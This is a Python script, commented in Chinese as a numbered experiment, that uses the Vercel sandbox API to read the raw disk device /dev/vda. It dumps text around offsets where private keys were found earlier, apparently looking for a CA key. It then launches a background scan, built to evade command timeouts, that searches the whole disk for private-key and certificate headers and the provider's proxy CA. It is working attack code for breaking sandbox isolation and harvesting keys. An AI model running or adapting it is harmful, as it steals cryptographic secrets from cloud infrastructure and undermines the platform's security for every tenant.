# 实验J124: 读取 EC 私钥命中上下文(@1509910) + 后台全盘扫描(规避cmd超时)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=600, args=None):
    body = {"command": "python3", "args": (args or ["-c", code]),
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj124"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# [A] 读 @1509910 和 @1999672 上下文(各 16KB), 检查是否为 ca-key.pem
READCTX = r"""
import sys
for off in [1509910, 1999672, 9549316]:
    print("\n=== CTX @ %d ===" % off, flush=True)
    f = open("/dev/vda", "rb", buffering=0)
    f.seek(max(0, off - 2048))
    ctx = f.read(16384)
    f.close()
    # 输出可打印部分(PEM 文本)
    try:
        txt = ctx.decode("utf-8", errors="replace")
        print(txt[:4000], flush=True)
    except Exception:
        print(ctx[:4000], flush=True)
print("READCTX_DONE", flush=True)
"""
run_cmd(sid, READCTX, "read-ctx")

# [B] 后台全盘扫描: 写脚本 -> nohup 后台 -> 轮询输出文件
SCAN = r"""
import os, sys, time, hashlib
start = int(sys.argv[1]) if len(sys.argv) > 1 else 0
end = int(sys.argv[2]) if len(sys.argv) > 2 else 35433480192
feats = [b"-----BEGIN PRIVATE KEY-----", b"-----BEGIN RSA PRIVATE KEY-----",
         b"-----BEGIN EC PRIVATE KEY-----", b"-----BEGIN ENCRYPTED PRIVATE KEY-----",
         b"-----BEGIN CERTIFICATE-----", b"PRIVATE KEY-----"]
anchor = None
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p, "rb").read()
        anchor = d[:256]
        break
    except Exception:
        pass
BS = 8 * 1024 * 1024
f = open("/dev/vda", "rb", buffering=0)
f.seek(start)
pos = start
t0 = time.time()
hits = []
try:
    while pos < end:
        chunk = f.read(BS)
        if not chunk:
            break
        pos += len(chunk)
        for feat in feats:
            i = chunk.find(feat)
            if i >= 0:
                off = pos - len(chunk) + i
                hits.append((off, feat.decode()))
                print("HIT %d %s" % (off, feat.decode()), flush=True)
        if anchor:
            i = chunk.find(anchor)
            if i >= 0:
                off = pos - len(chunk) + i
                hits.append((off, "ANCHOR"))
                print("HIT %d ANCHOR" % off, flush=True)
        if pos % (32 * BS) == 0:
            print("PROGRESS %.2f GB %.0fs" % (pos / 2**30, time.time() - t0), flush=True)
finally:
    f.close()
print("SCAN_TOTAL %d hits in %.1fs" % (len(hits), time.time() - t0), flush=True)
print("SCAN_DONE", flush=True)
"""
# 写入脚本
run_cmd(sid, """
open("/root/scan.py", "w").write(%r)
print("written", len(%r))
""" % (SCAN, SCAN), "write-scan")

# 后台运行 (wait=False)
print("\n-- launching background scan --", flush=True)
body = {"command": "sh", "args": ["-c", "nohup python3 /root/scan.py 0 35433480192 > /root/scan_out.txt 2>&1 & echo BG_PID=$!"],
        "wait": False, "logs": True, "timeout": 60}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("launch:", c, r[:300], flush=True)

# 轮询输出
for i in range(12):
    time.sleep(20)
    body = {"command": "sh", "args": ["-c", "wc -l /root/scan_out.txt 2>/dev/null; tail -5 /root/scan_out.txt 2>/dev/null; grep -c SCAN_DONE /root/scan_out.txt 2>/dev/null"],
            "wait": True, "logs": True, "timeout": 60}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
        except Exception:
            out += line
    print(f"[poll {i}] {out.strip()}", flush=True)
    if "1" in [l.strip() for l in out.splitlines() if "SCAN_DONE" in l]:
        # grep -c 返回 1
        if any("SCAN_DONE" in l and l.strip() == "1" for l in out.splitlines()):
            break
    if "SCAN_DONE" in out:
        break

# 输出完整结果
print("\n== full scan_out.txt ==", flush=True)
body = {"command": "cat", "args": ["/root/scan_out.txt"], "wait": True, "logs": True, "timeout": 60}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            print(d.get("data", ""), end="", flush=True)
        elif d.get("stream") == "command":
            print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
    except Exception:
        print(line[:300], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
